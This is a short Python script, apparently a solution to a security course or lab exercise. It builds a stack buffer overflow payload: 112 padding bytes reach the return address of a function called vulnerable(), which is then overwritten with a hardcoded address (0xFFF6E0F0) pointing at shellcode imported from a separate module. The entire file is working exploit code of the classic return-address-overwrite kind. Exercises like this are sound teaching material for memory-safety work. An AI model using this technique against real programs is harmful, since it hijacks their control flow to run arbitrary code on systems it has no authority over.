import sys
from shellcode import shellcode

"""
112: offset until ret addr in vulnerable()
0xFFF6E0F0: start addr of shellcode
"""

sys.stdout.buffer.write(b"A" * 112)
sys.stdout.buffer.write(0xFFF6E0F0.to_bytes(4, "little"))
sys.stdout.buffer.write(shellcode)
